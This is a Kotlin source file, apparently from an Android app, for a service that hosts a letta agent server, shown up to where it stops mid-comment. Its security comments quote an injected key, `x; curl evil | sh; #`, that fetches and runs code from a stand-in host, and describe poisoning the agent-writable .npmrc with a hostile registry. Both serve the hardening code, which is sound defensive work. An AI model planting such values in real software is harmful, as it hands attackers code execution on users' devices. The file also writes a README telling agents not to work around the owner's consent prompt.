package com.angussoftware.letta.env

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.io.File
import java.security.MessageDigest
import java.nio.file.Files
import java.util.zip.GZIPInputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * Runs the letta server as a cloud execution environment on Android.
 *
 * Architecture (v3 — native lib dir, "everything exec-mapped lives in libdir"):
 *
 * Android's untrusted_app domain DENIES mmap(PROT_EXEC) of app_data_file
 * (files in filesDir), while execve of app_data IS allowed (static binaries
 * run) and the APK native lib dir (apk_data_file label) allows execute
 * mappings unconditionally. Therefore every file the dynamic loader maps —
 * the loader itself, libc & friends, node, guest bash, ripgrep, and all
 * .node native addons — ships in lib/arm64-v8a (injected post-build because
 * AGP filters non-lib*.so names) and is invoked as:
 *
 *   <libdir>/libldlnx.so --library-path <libdir> <libdir>/libnode.so <letta.js> server ...
 *
 * Additional Android fixes layered on top:
 *   - letta.js ships PRE-PATCHED: link()/linkSync() lock files replaced with
 *     writeFileSync(flag:"wx") — SELinux denies hardlinks on app_data_file.
 *   - ld-linux + libc patched: rseq syscall site returns -ENOSYS — the app
 *     seccomp filter (old targetSdk policy) TRAPs syscall 293 → SIGSYS.
 *   - dns-shim.js preloaded via NODE_OPTIONS: no /etc/resolv.conf on Android.
 *   - files/bin/bash wrapper: Bash tool → Debian bash via libdir chain.
 *   - rg wrapper script replaces the glibc rg binary (its PT_INTERP doesn't
 *     exist on the host fs); addons + libvips are symlinked into node_modules.
 */
class LettaEnvironmentService : Service() {

    // Internal (not private) so the JVM unit test can exercise the
    // reconciliation decision core without an Android runtime.
    internal enum class State { IDLE, STARTING, RUNNING, STOPPING }

    // Pending operation set while the server runs; the worker loop acts on
    // it after the current process exits (see worker body). Internal so the
    // JVM-testable classifyWorkerException (companion) can take it as a
    // parameter — nested-in-companion classifiers are not reachable from
    // the test source set via the class name.
    internal enum class PendingOp { UPGRADE, RESTART, SHUTDOWN }

    companion object {
        // Security sink validation (adversarial review Oct 8): these values
        // are interpolated into a generated shell script and into process
        // environments. The on-screen input path validates (MainActivity),
        // but the watch key-sync listener and any future write path did NOT —
        // a forged wearable message could plant a key like `x; curl evil | sh; #`
        // that executed at every server start. The sink must enforce its own
        // contract; input-path validation is UX, not security.
        val KEY_REGEX: Regex = Regex("^sk-let-[A-Za-z0-9+/=_-]{20,}$")
        val ENV_REGEX: Regex = Regex("^[a-z0-9][a-z0-9-_]{0,63}$")
        /** Null unless the key matches the strict shape. Use at every sink. */
        fun validatedKey(raw: String?): String? =
            raw?.trim()?.takeIf { KEY_REGEX.matches(it) }
        /** Null unless the env name matches the strict shape. */
        fun validatedEnv(raw: String?): String? =
            raw?.trim()?.takeIf { ENV_REGEX.matches(it) }

        /**
         * Integrity manifest entry (review 2731, PR #118). Parsed from the
         * APK asset integrity-manifest.txt — the single authority. The
         * filesDir copy of the manifest is diagnostics-only.
         *
         * source semantics:
         *   asset:<name>  — restore bytes = the APK asset <name> (immutable).
         *   rootfs:<path> — filesDir/<path> is UNTRUSTED CACHE; the true
         *                   authority bytes live in the tar member (member
         *                   field, or the path itself) of the APK's pinned
         *                   rootfs.tar asset. Install order: write-cache from
         *                   the untrusted copy ONLY if it already matches the
         *                   manifest hash; restore from the tar member
         *                   otherwise (direct-asset fallback first).
         */
        internal data class ManifestEntry(
            val dest: String,          // path under filesDir; "libs/x" allowed
            val sha256: String,        // lowercase hex authority hash
            val source: String,        // "asset:NAME" or "rootfs:PATH"
            val member: String?,       // real member name when rootfs path is a symlink
            val optional: Boolean,     // verify-if-present: absence tolerated
        ) {
            val destFileBase: String get() = dest.substringAfterLast('/')
        }

        /**
         * Parse the APK asset integrity-manifest.txt. NEVER reads the
         * filesDir copy (an attacker could plant a permissive manifest
         * there — the asset inside the signed APK is the only authority).
         */
        internal fun parseIntegrityManifest(text: String): List<ManifestEntry> {
            val out = ArrayList<ManifestEntry>(32)
            for (rawLine in text.lineSequence()) {
                val line = rawLine.trim()
                if (line.isEmpty() || line.startsWith("#")) continue
                val cols = line.split('\t')
                if (cols.size < 3) continue
                val dest = cols[0]
                val sha = cols[1].lowercase(Locale.ROOT)
                val source = cols[2]
                // 'optional' may appear as col4 (no tar-member) or col5 —
                // never treat it as a member name.
                val member = cols.getOrNull(3)?.takeIf { it.isNotBlank() && it != "optional" }
                    ?: cols.getOrNull(4)?.takeIf { it.isNotBlank() && it != "optional" }
                val optional = cols.getOrNull(3)?.trim() == "optional" ||
                    cols.getOrNull(4)?.trim() == "optional"
                if (dest.isEmpty() || !source.startsWith("asset:") && !source.startsWith("rootfs:")) continue
                if (!sha.matches(Regex("^[0-9a-f]{64}$"))) continue
                out.add(ManifestEntry(dest, sha, source, member, optional))
            }
            return out
        }

        /**
         * Parse the letta.js pin-version from the manifest header
         * (`# letta.js pin-version: X.Y.Z`, written by the generator). Null =
         * header absent (old manifest → pin inactive) or malformed.
         */
        internal fun parseManifestPinVersion(text: String): String? =
            text.lineSequence()
                .firstOrNull { it.trim().startsWith("# letta.js pin-version:") }
                ?.substringAfter(':')?.trim()
                ?.takeIf { it.matches(Regex("^\\d+\\.\\d+\\.\\d+$")) }

        /** Chunked-stream sha256 (never loads whole files into memory). */
        internal fun sha256Of(f: File): String {
            val md = MessageDigest.getInstance("SHA-256")
            f.inputStream().use { s ->
                val buf = ByteArray(64 * 1024)
                while (true) {
                    val n = s.read(buf)
                    if (n < 0) break
                    md.update(buf, 0, n)
                }
            }
            return md.digest().joinToString("") { "%02x".format(it) }
        }
        // Dedicated channel for the persistent environment-running notification so users
        // can control it independently from any future alert channels.
        private const val CHANNEL_ID = "letta-env-status"
        private const val NOTIFICATION_ID = 42
        @Volatile private var proc: Process? = null
        // Lifecycle state. Values: idle -> starting -> running -> stopping.
        // The worker holds "starting"/"running" ONLY while its process lives;
        // it returns to idle in the worker's finally block. Intent handlers
        // (start/upgrade/rekey) CAS from a state they can actually occupy —
        // see onStartCommand. Replaces the old single `starting` boolean,
        // which the worker held for the ENTIRE server lifetime (waitFor
        // blocks in runEnvironment), making Upgrade a silent no-op whenever
        // the server was up (adversarial review Sep 20, finding task_93 #1).
        private val lifecycle = java.util.concurrent.atomic.AtomicReference(State.IDLE)
        // True while a worker thread owns the starting/running states. The
        // worker sets it in its first instruction and clears it in its finally
        // block — companion-visible so isEnvironmentIdle() can distinguish
        // "state machine has a live owner" from "stale enum after process
        // death" (onDestroy stamps STOPPING unconditionally; see
        // isEnvironmentIdle's doc).
        private val workerAlive = java.util.concurrent.atomic.AtomicBoolean(false)
        // Pending operation set while the server runs; the worker loop acts
        // on it after the current process exits (see worker body).
        private val pendingOp = java.util.concurrent.atomic.AtomicReference<PendingOp>(null)
        const val PREFS = "letta_env"
        const val PREF_KEY = "api_key"
        const val ACTION_UPGRADE = "com.angussoftware.letta.env.action.UPGRADE"
        const val ACTION_RESTART = "com.angussoftware.letta.env.action.RESTART"
        const val ACTION_START_EXPLICIT = "com.angussoftware.letta.env.action.START_EXPLICIT"
        const val ACTION_STOP_EXPLICIT = "com.angussoftware.letta.env.action.STOP_EXPLICIT"
        const val PREF_ENV = "env_name"
        const val DEFAULT_ENV = "android"

        // Registration-output → status mapping (tailer). Pure and
        // JVM-testable (RegistrationLineTest): the tailer feeds each stdout
        // line through [classifyRegistrationLine] and applies the returned
        // status/notification pair, so the mapping lives here instead of
        // inline in the thread body. Auth-rejection detection (audit fix 6):
        // a 401/Unauthorized/invalid-key line in the registration output is
        // surfaced as "Key rejected by Letta Cloud" — not a generic
        // "exited: N" — so the user knows to re-key rather than reinstall.
        /** Status classification for one line of server registration output. */
        data class RegStatus(val status: String, val notification: String?)

        /**
         * Case-insensitive auth-rejection heuristic for server stdout lines.
         * The server prints its own error text for rejected keys (401 /
         * Unauthorized / invalid api key variants); matching is deliberately
         * broad and substring-based because the exact wording comes from the
         * letta server, not from this app, and may change between versions.
         */
        fun isAuthRejection(line: String): Boolean {
            val l = line.lowercase()
            return l.contains("401") ||
                l.contains("unauthorized") ||
                l.contains("invalid api key") ||
                l.contains("invalid_api_key") ||
                l.contains("invalid api-key") ||
                l.contains("authentication failed") ||
                l.contains("auth failed")
        }

        /**
         * Map one stdout line to the status it should set, or null when the
         * line carries no state signal (the common case — the server logs a
         * lot of ordinary traffic). The notification is null when the caller
         * composes it (the [Listen V2] case appends the current env name).
         */
        fun classifyRegistrationLine(line: String): RegStatus? = when {
            isAuthRejection(line) ->
                RegStatus("key rejected by Letta Cloud — check your API key", "Key rejected by Letta Cloud")
            line.contains("Registering with") ->
                RegStatus("registering with Letta Cloud", "Registering...")
            line.contains("Registered successfully") ->
                RegStatus("registered with Letta Cloud", "Registered — online")
            line.contains("[Listen V2]") ->
                RegStatus("online — listener active", null)
            else -> null
        }

        /**
         * Pure decision core of stale-state reconciliation (JVM-testable —
         * LifecycleReconcileTest): a non-IDLE state is only real while it
         * has an owner — a live worker thread, or a live server process
         * (adopted from a previous service instance). When both are gone
         * the state is a fossil from process death and must fall back to
         * IDLE, or Start/Upgrade gate on it forever (v0.4.6 stuck-STOPPING).
         */
        internal fun reconciledState(state: State, workerAlive: Boolean, procAlive: Boolean): State =
            if (state != State.IDLE && !workerAlive && !procAlive) State.IDLE else state

        /**
         * Classification for an exception thrown out of [runEnvironment]
         * while a worker is mid-flight (the worker loop's catch-all, on-device
         * v0.4.9: Stop button raced this handler and the status flip-flopped
         * between "stopped (by user)" and "failed: null" — the "FATAL: null"
         * log signature was an exception with a null message, almost
         * certainly the reader/worker interrupted by the Stop handler's
         * proc.destroy()). Pure and JVM-testable (WorkerExceptionPolicyTest):
         * when a shutdown is in flight (pendingOp == SHUTDOWN, or the
         * lifecycle is draining a stop, or the user-stop marker exists) the
         * exception is a benign consequence of OUR OWN teardown, not a server
         * failure — it must not overwrite the truthful "stopped" status.
         */
        data class WorkerExceptionPolicy(val benign: Boolean, val logLine: String)

        /** see [WorkerExceptionPolicy]. */
        internal fun classifyWorkerException(
            t: Throwable,
            pendingOp: PendingOp?,
            state: State,
            userStopMarker: Boolean
        ): WorkerExceptionPolicy =
            if (pendingOp == PendingOp.SHUTDOWN || state == State.STOPPING || userStopMarker) {
                WorkerExceptionPolicy(
                    benign = true,
                    logLine = "reader interrupted during shutdown (${t.javaClass.simpleName}) — not a failure"
                )
            } else {
                // Real failure: always name the exception class — a bare
                // "FATAL: null" (null-message InterruptedException etc.) is
                // undiagnosable from the log alone.
                WorkerExceptionPolicy(
                    benign = false,
                    logLine = "FATAL: ${t.javaClass.simpleName}: ${t.message}"
                )
            }

        /**
         * True when no agent session/environment process is running (idle,
         * per the v0.2.8 lifecycle state machine). The self-updater gates
         * its prompts and overnight auto-installs on this — never update
         * out from under a live session.
         *
         * Process-death truth: [onDestroy] stamps STOPPING unconditionally,
         * but the worker may have already exited to IDLE before the service
         * tears down (SIGTERM kills node in milliseconds; onDestroy runs a
         * main-thread hop later) — and once the worker thread is gone, no
         * code path ever resets the state, so STOPPING sticks FOREVER across
         * process death (v0.4.4 on-device: update card never re-appeared
         * after stop → start → stop; Start intents were silently ignored).
         * The worker thread is the sole owner of starting/running; when it
         * is dead, the only live thing that can exist is a server process
         * adopted from a previous service instance — so "no live process"
         * IS the ground truth for idle, regardless of the stale enum.
         */
        fun isEnvironmentIdle(): Boolean =
            if (workerAlive.get()) lifecycle.get() == State.IDLE
            else proc?.isAlive != true
    }

    private fun apiKey(): String =
        getSharedPreferences(PREFS, MODE_PRIVATE).getString(PREF_KEY, "") ?: ""

    private fun envName(): String =
        getSharedPreferences(PREFS, MODE_PRIVATE).getString(PREF_ENV, DEFAULT_ENV) ?: DEFAULT_ENV

    private var worker: Thread? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Starting..."))
        // Self-updater periodic checks ride this already-running foreground
        // service — no new always-running process (spec Sep 30).
        UpdateManager.startPeriodicChecks(this)
        UpdateManager.onStatusRerender = { rerenderNotification() }

        // Stale-status invalidation: an install/kill leaves status.txt claiming
        // "online" from a dead process. On any service start, if no server
        // process is alive, rewrite status from reality BEFORE anything else
        // (Sep 25: watch showed "online" for 25 min with no process).
        if (proc?.isAlive != true) {
            val sf = File(filesDir, "status.txt")
            val cur = if (sf.exists()) sf.readText() else ""
            if (cur.contains("online") || cur.contains("registered")) {
                setStatus("stopped — restarting (stale online status cleared)")
                log("STATUS: cleared stale '${cur.lineSequence().firstOrNull { it.startsWith("state=") }}' (no live process)")
            }
        }

        // Process-death truth, applied at EVERY entry path: onDestroy stamps
        // STOPPING unconditionally, and if the worker already exited (SIGTERM
        // kills node in milliseconds; onDestroy runs a main-thread hop later)
        // nothing ever resets the enum — STOPPING sticks forever across
        // service restarts (v0.4.6 on-device: Start button no-oped with
        // status "Stopped"). Reconcile BEFORE dispatching any intent so
        // every handler sees the true state.
        reconcileStaleLifecycle()

        // agentctl notify: title/text extras on a broadcast routed here
        if (intent?.action == "com.angussoftware.letta.env.AGENT_NOTIFY") {
            postAgentAlert(
                intent.getStringExtra("title") ?: "Agent",
                intent.getStringExtra("text") ?: "")
            return START_NOT_STICKY
        }

        when (intent?.action) {
            ACTION_UPGRADE -> handleUpgradeIntent()
            ACTION_RESTART -> handleRestartIntent()
            ACTION_START_EXPLICIT -> {
                // Explicit Start button: clears the user-stop marker so the
                // server (re)launches even if previously stopped by the user.
                File(filesDir, ".user-stopped").delete()
                handleStartIntent()
            }
            ACTION_STOP_EXPLICIT -> {
                // Explicit Stop button: sticky marker so app re-opens don't
                // resurrect. onDestroy does NOT set the marker — install-kills
                // also run onDestroy and must not look like user stops.
                runCatching { File(filesDir, ".user-stopped").writeText(Date().toString()) }
                pendingOp.set(PendingOp.SHUTDOWN)
                lifecycle.compareAndSet(State.IDLE, State.STOPPING)
                setStatus("stopped (by user)")
                try { proc?.destroy() } catch (_: Exception) {}
                stopSelf()
            }
            else -> handleStartIntent()
        }
        return START_STICKY
    }

    /**
     * Reset a stale lifecycle enum to IDLE when process death proves no
     * owner exists. The worker thread is the sole owner of STARTING/RUNNING;
     * STOPPING is set by intent handlers/onDestroy and is only legitimately
     * held while a worker or process is still draining. When BOTH the worker
     * is gone AND no server process is alive, the state is a fossil from a
     * previous service instance — force it back to IDLE so intent handlers
     * don't gate on it forever (v0.4.6: stuck STOPPING made Start a silent
     * no-op). Companion-visible state, so the logic is stated here once and
     * applied from onStartCommand before any intent dispatch.
     */
    private fun reconcileStaleLifecycle() {
        val s = lifecycle.get()
        val target = reconciledState(s, workerAlive.get(), proc?.isAlive == true)
        if (target != s && lifecycle.compareAndSet(s, target)) {
            log("lifecycle: stale ${s.name.lowercase()} with no worker and no process — reset to idle")
        }
    }

    /**
     * Start when idle. If already running: schedule a restart ONLY when the
     * configuration changed (re-key / rename — MainActivity rewrites prefs
     * before sending this); otherwise it's a stray double-tap — re-assert the
     * current state instead of corrupting it (old bug: setStatus("starting")
     * fired BEFORE the guard, leaving status/notification stuck at "starting"
     * forever while the server ran fine — review task_93 #2).
     */
    private fun handleStartIntent() {
        // User-stop is sticky across app re-opens: if the user pressed Stop,
        // opening the app must NOT silently resurrect the server. The marker
        // is cleared by the Start button (explicit user intent) and by
        // saveOnboarding (config change = definite restart).
        val stopMarker = File(filesDir, ".user-stopped")
        if (stopMarker.exists() && lifecycle.get() == State.IDLE) {
            log("start intent with user-stop marker and no server — staying stopped (explicit Start clears)")
            updateNotification("Stopped — tap Start to run")
            return
        }
        when (lifecycle.get()) {
            State.IDLE -> {
                if (!lifecycle.compareAndSet(State.IDLE, State.STARTING)) return handleStartIntent()
                setStatus("starting")
                spawnWorker()
            }
            State.RUNNING, State.STARTING -> {
                if (configChanged()) {
                    log("config changed — restarting to apply new key/env name")
                    pendingOp.set(PendingOp.RESTART)
                    // Ask the running server to exit; the worker loop relaunches
                    // with the fresh prefs.
                    try { proc?.destroy() } catch (_: Exception) {}
                } else {
                    log("start requested while already ${lifecycle.get().name.lowercase()} — ignoring")
                    // Re-assert real state so status.txt/notification stay truthful.
                    reassertState()
                }
            }
            State.STOPPING -> {
                // Defense in depth: onStartCommand reconciles before dispatch,
                // but if a stale STOPPING still lands here (no worker, no
                // process), retry as a start instead of ignoring forever.
                if (!workerAlive.get() && proc?.isAlive != true) {
                    log("start requested while 'stopping' — but no worker/process exists; retrying as start")
                    return handleStartIntent()
                }
                log("start requested while stopping — ignoring")
            }
        }
    }

    /**
     * Upgrade: when idle, run immediately. When running, mark pending and stop
     * the server — the worker loop performs upgrade + relaunch after exit
     * (old bug: the entire flow was gated on a flag held for the server's
     * whole lifetime, so Upgrade while running was ALWAYS a silent no-op —
     * review task_93 #1).
     */
    private fun handleUpgradeIntent() {
        when (lifecycle.get()) {
            State.IDLE -> {
                if (!lifecycle.compareAndSet(State.IDLE, State.STARTING)) return handleUpgradeIntent()
                setStatus("upgrading letta-code")
                spawnWorker(upgradeFirst = true)
            }
            State.RUNNING, State.STARTING -> {
                if (pendingOp.compareAndSet(null, PendingOp.UPGRADE)) {
                    log("upgrade requested while running — stopping server; upgrade follows")
                    setStatus("stopping for upgrade")
                    try { proc?.destroy() } catch (_: Exception) {}
                } else {
                    log("upgrade already pending — ignoring")
                }
            }
            State.STOPPING -> {
                // Same stale-state defense as handleStartIntent's STOPPING
                // branch: a fossil STOPPING must not swallow the upgrade.
                if (!workerAlive.get() && proc?.isAlive != true) {
                    log("upgrade requested while 'stopping' — but no worker/process exists; retrying as upgrade")
                    return handleUpgradeIntent()
                }
                log("upgrade requested while stopping — ignoring")
            }
        }
    }

    /** Explicit restart (used by rekey flow via start intent; kept for future UI). */
    private fun handleRestartIntent() = handleStartIntent()

    /**
     * Worker: runs the environment; on process exit, drains any pending
     * operation (upgrade / restart) in a loop until none remain, then goes
     * idle. All state transitions originate here or in the intent handlers
     * via CAS — no path leaves lifecycle stuck.
     */
    private fun spawnWorker(upgradeFirst: Boolean = false) {
        worker = Thread {
            // Companion-visible: isEnvironmentIdle() reads this to know the
            // state machine has a live owner (see its doc for the stuck-STOPPING
            // process-death bug this closes).
            workerAlive.set(true)
            var doUpgrade = upgradeFirst
            try {
                while (true) {
                    if (doUpgrade) {
                        try {
                            if (!upgradeLetta()) {
                                // Fail-closed upgrade (Oct 8 set-3 follow-up):
                                // upgradeLetta reports an install that must
                                // NOT be booted (0 patch sites on a fresh
                                // file, or installed-version != pinned).
                                // Status already reflects the failure; going
                                // idle without launching is the block.
                                log("UPGRADE: fail-closed — not launching after failed upgrade")
                                break
                            }
                        } catch (t: Throwable) {
                            log("UPGRADE FATAL: ${t.message}")
                            setStatus("upgrade failed: ${t.message ?: t.javaClass.simpleName}")
                            updateNotification("Upgrade failed")
                        }
                    }
                    try {
                        runEnvironment()
                    } catch (t: Throwable) {
                        // v0.4.9 on-device: Stop (ACTION_STOP_EXPLICIT) sets
                        // pendingOp=SHUTDOWN + STOPS the lifecycle + writes
                        // the user-stop marker + proc.destroy() — and the
                        // reader/worker blocked on the dying process throws a
                        // null-message exception that landed HERE, flipping
                        // the status to "failed: null" ~half the time and
                        // racing the stop handler's own "stopped (by user)"
                        // write. When a shutdown is in flight the exception
                        // is a consequence of OUR teardown, not a failure —
                        // log it benignly and leave the truthful stop status.
                        val policy = classifyWorkerException(
                            t, pendingOp.get(), lifecycle.get(),
                            File(filesDir, ".user-stopped").exists()
                        )
                        log(policy.logLine)
                        if (!policy.benign) {
                            setStatus("failed: ${t.javaClass.simpleName}: ${t.message}")
                            updateNotification("Failed")
                        }
                    }
                    // Process exited. Drain pending op, else idle.
                    when (pendingOp.getAndSet(null)) {
                        PendingOp.UPGRADE -> {
                            log("pending upgrade — running it now")
                            doUpgrade = true
                            continue
                        }
                        PendingOp.RESTART -> {
                            log("pending restart — relaunching with current config")
                            doUpgrade = false
                            continue
                        }
                        // Review #18 F2 (Angus): user Stop during a pending op
                        // must NOT relaunch — the drain loop treats SHUTDOWN
                        // as terminal and the worker exits to idle.
                        PendingOp.SHUTDOWN -> {
                            log("shutdown requested — not relaunching")
                            break
                        }
                        null -> break
                    }
                }
            } finally {
                lifecycle.set(State.IDLE)
                workerAlive.set(false)
            }
        }.also { it.start() }
    }

    /**
     * True when prefs (API key / env name) differ from what the RUNNING server
     * was launched with. The launch snapshot is written by runEnvironment().
     */
    private fun configChanged(): Boolean {
        val snap = File(filesDir, ".launch-config")
        if (!snap.exists()) return true
        // Mirrors the fingerprint write in runEnvironment() (Oct 8 security:
        // no plaintext key on disk — env name + key fingerprint only).
        val keyFp = java.security.MessageDigest.getInstance("SHA-256")
            .digest(apiKey().toByteArray()).take(4).joinToString("") { "%02x".format(it) }
        val expected = "$keyFp\n${envName()}"
        return snap.readText() != expected
    }

    /** Rewrite status.txt + notification from process reality, not intent history. */
    private fun reassertState() {
        val alive = proc?.isAlive == true
        val statusFile = File(filesDir, "status.txt")
        val current = if (statusFile.exists()) statusFile.readText() else ""
        if (!alive) return // worker will transition states momentarily
        if (!current.contains("online") && !current.contains("registered")) {
            // Unknown-but-alive: the tailer's string matching may have missed
            // upstream log wording; state the provable fact.
            setStatus("running (process alive)")
            updateNotification("Running — ${envName()}")
        } else {
            updateNotification("Online — ${envName()}")
        }
    }

    /**
     * Drop an honest README into the agent's shell home at every server
     * start. Zero-context agents that land here via dispatch see the trust
     * picture before their first action — even if they never discover
     * agentctl. Refreshed each launch so it can never go stale.
     */
    private fun writeAgentReadme(rootfsDir: File) {
        runCatching {
            val home = File(rootfsDir, "root")
            home.mkdirs()
            File(home, "README.txt").writeText("""
                You are running on someone's Android device (app: Agents Beamdown).

                Before doing anything, run:  agentctl access
                That prints the complete, live-verified access manifest: what
                this environment can touch, every agentctl command with its
                consent class, and the session rules.

                The short version:
                - Your shell runs as an unprivileged app uid (no root). You can
                  read/write this app's storage and /sdcard (shared storage).
                  Other apps' private data is invisible; /system is read-only.
                - Screen reading, tapping, typing, launching, and notification
                  content are CONSENT-GATED: they require the device owner to
                  approve a full-screen overlay (agentctl session "description").
                  Timeout or decline = denied, fail-closed.
                - Health/location telemetry run under their Android permission
                  grants — the grant IS the consent.

                The device owner sees a consent prompt. Don't work around it.
                (generated at server start; agentctl access is always live truth)
            """.trimIndent())
        }.onFailure { log("agent README write failed: ${it.message}") }
    }

    /**
     * Upgrade @letta-ai/letta-code inside the rootfs via npm, re-apply the
     * Android-specific letta.js patches (SELinux forbids the hardlink-based
     * locks), then hand back to runEnvironment() to relaunch the server.
     */
    private fun upgradeLetta(): Boolean {
        val libDir = File(applicationInfo.nativeLibraryDir)
        val libLoader = File(libDir, "libldlnx.so")
        val rootfsDir = File(filesDir, "rootfs")
        val nodeModules = File(rootfsDir, "usr/local/lib/node_modules")
        val npmCli = File(nodeModules, "npm/bin/npm-cli.js")
        val pkgJson = File(nodeModules, "@letta-ai/letta-code/package.json")

        fun currentVersion(): String = try {
            val m = Regex("\"version\"\\s*:\\s*\"([^\"]+)\"").find(pkgJson.readText())
            m?.groupValues?.get(1) ?: "unknown"
        } catch (_: Exception) { "unknown" }

        val before = currentVersion()
        setStatus("upgrading letta-code (from $before)")
        updateNotification("Upgrading letta-code...")
        log("UPGRADE: current version $before")

        // 1. Stop the running server (it holds the install we're replacing).
        try { proc?.destroy() } catch (_: Exception) {}
        runCatching { proc?.waitFor(5, TimeUnit.SECONDS) }
        proc = null

        // 2. npm install -g @letta-ai/letta-code@latest via the loader chain.
        //    --ignore-scripts: postinstall spawns `node` via process.execPath,
        //    which is the loader invocation here and cannot be re-spawned raw.
        // Security (Oct 8 set 3, adversarial review): the agent shell shares
        // this uid and can write rootfs/root/.npmrc — a poisoned
        // `registry=https://evil/` line made the next upgrade install
        // attacker code with full app privileges. Hardening:
        //  - HOME = a scratch dir created fresh per upgrade (cleared first —
        //    nothing the agent staged survives into npm's config discovery)
        //  - registry pinned on the CLI (npm_config_registry env beats both
        //    .npmrc files) to the official https endpoint
        //  - userconfig pointed at the scratch dir (no user .npmrc read)
        val npmHome = File(filesDir, "npm-home").apply {
            deleteRecursively(); mkdirs()
        }
        val npmEnv = mapOf(
            "HOME" to npmHome.absolutePath,
            "TMPDIR" to File(rootfsDir, "tmp").absolutePath,
            "PATH" to File(filesDir, "bin").absolutePath + ":/system/bin:/system/xbin",
            "SHELL" to File(File(filesDir, "bin"), "bash").absolutePath,
            "LD_LIBRARY_PATH" to libDir.absolutePath + ":" + File(filesDir, "libs").absolutePath,
            "NODE_OPTIONS" to "--require ${File(filesDir, "fs-shim.js").absolutePath} --require ${File(filesDir, "dns-shim.js").absolutePath}",
            "UV_USE_IO_URING" to "0",
            "npm_config_registry" to "https://registry.npmjs.org/",
            "npm_config_userconfig" to File(npmHome, ".npmrc").absolutePath,
            "npm_config_strict_ssl" to "true"
        )
        // Security (set 3): resolve @latest to an EXACT version first, then
        // install that exact version. A swapped-tag attack (registry serves
        // version X in the manifest, different content in the tarball) can
        // still theoretically diverge, but exact-pin + post-install version
        // assert (below) makes the common downgrade/redirect paths loud.
        val resolvePb = ProcessBuilder(
            libLoader.absolutePath, "--library-path", npmEnv["LD_LIBRARY_PATH"]!!,
            File(libDir, "libnode.so").absolutePath, npmCli.absolutePath,
            "view", "@letta-ai/letta-code", "version"
        ).apply {
            environment().clear()
            environment().putAll(npmEnv)
            redirectErrorStream(true)
        }
        val resolved = try {
            val rp = resolvePb.start()
            val out = rp.inputStream.bufferedReader().readText().trim()
            rp.waitFor(60, TimeUnit.SECONDS)
            out.lineSequence().lastOrNull { it.matches(Regex("^\\d+\\.\\d+\\.\\d+$")) }
        } catch (t: Throwable) { null }
        if (resolved == null) {
            log("UPGRADE: failed to resolve latest version — aborting upgrade")
            setStatus("upgrade failed: version resolve")
            updateNotification("Upgrade failed")
            return true // npm never ran — previous (patched) install is intact; boot it
        }
        log("UPGRADE: resolved latest = $resolved; installing exact pin")
        val pb = ProcessBuilder(
            libLoader.absolutePath, "--library-path", npmEnv["LD_LIBRARY_PATH"]!!,
            File(libDir, "libnode.so").absolutePath, npmCli.absolutePath,
            "install", "-g", "@letta-ai/letta-code@$resolved", "--ignore-scripts",
            "--prefix", File(rootfsDir, "usr/local").absolutePath
        ).apply {
            environment().clear()
            environment().putAll(npmEnv)
            redirectErrorStream(true)
        }
        log("UPGRADE: running npm install @letta-ai/letta-code@$resolved ...")
        val p = try { pb.start() } catch (t: Throwable) {
            log("UPGRADE: npm failed to start: ${t.message}")
            setStatus("upgrade failed: ${t.message}")
            return true // previous install untouched — safe to boot
        }
        // Stream npm output into server.log.
        val reader = Thread {
            try {
                p.inputStream.bufferedReader().forEachLine { log("npm: $it") }
            } catch (_: Exception) {}
        }.also { it.isDaemon = true; it.start() }
        val finished = p.waitFor(10, TimeUnit.MINUTES)
        if (!finished) {
            p.destroyForcibly()
            log("UPGRADE: npm timed out after 10 minutes")
            setStatus("upgrade failed: npm timeout")
            updateNotification("Upgrade failed")
            return true // npm killed mid-flight; previous install likely intact — boot it
        }
        val npmExit = p.exitValue()
        log("UPGRADE: npm exit code $npmExit")
        // Security (set 3): verify the INSTALLED version matches the pinned
        // resolution — a registry that served different content under the
        // same tag name diverges here.
        val installedPkg = File(nodeModules, "@letta-ai/letta-code/package.json")
        if (npmExit == 0 && installedPkg.exists()) {
            val installedV = runCatching {
                org.json.JSONObject(installedPkg.readText()).optString("version", "")
            }.getOrDefault("")
            if (installedV != resolved) {
                log("UPGRADE: SECURITY — installed version $installedV != pinned $resolved; rolling back")
                setStatus("upgrade failed: version mismatch")
                updateNotification("Upgrade failed")
                return false // registry served a different version than resolved — do NOT boot it
            }
        }
        if (npmExit != 0) {
            log("UPGRADE: npm FAILED — restarting with whatever is installed (npm usually leaves the previous version intact)")
            setStatus("npm failed (exit $npmExit) — restarting")
            updateNotification("Upgrade failed — restarting")
            return true // npm failed before replacing the install — boot whatever survived
        }

        // 3. Re-apply Android patches to the fresh letta.js (hardlink locks
        //    are denied by SELinux on app_data_file). Mirror of patches #4 and
        //    #5 in tools/rootfs-build/patch-binaries.py — keep both in sync.
        // fs-shim.js handles ALL link() emulation at runtime now. String
        // patches CONFLICT with it (patched sites double-create: wx-write
        // from the patch + emulated link's own wx-write = EEXIST crash on
        // boot, Sep 26). Only the launcher/interpreter patches remain needed;
        // the link rewrites must NOT run when the shim is deployed.
        val applied = applyLettaJsPatches(nodeModules, linksHandled = true)
        if (applied == 0) {
            // Fail-closed (Oct 8 set-3 follow-up): npm JUST wrote this file,
            // so 0 sites means the patcher no longer matches upstream (not
            // "already patched" — fresh install has no prior boot). The
            // launcher/interpreter patches are load-bearing for Bash and
            // git hooks; booting unpatched bricks sessions silently. Keep
            // the previously-running install; the user sees the failure.
            log("UPGRADE: SECURITY — 0 patch sites in freshly installed letta.js; " +
                "patcher broken vs upstream. Not restarting into the new version " +
                "(previous install kept; update the patch patterns in the service " +
                "AND patch-binaries.py).")
            setStatus("upgrade failed: 0 patch sites")
            updateNotification("Upgrade failed — patch")
            return false // fresh-but-unpatchable letta.js must not boot
        }

        val after = currentVersion()
        log("UPGRADE: $before -> $after")
        setStatus("upgraded to $after — restarting")
        updateNotification("Upgraded to $after — restarting")
        return true
    }

    /**
     * Idempotent Android patches to letta.js. Mirror of patches #4/#5 in
     * tools/rootfs-build/patch-binaries.py — keep both in sync. Returns the
     * number of patch sites applied (0 = already patched OR upstream changed;
     * callers that just ran npm warn on 0, restart-path callers do not).
     *
     *  - link()/linkSync() lock files -> writeFileSync(flag:"wx") — SELinux
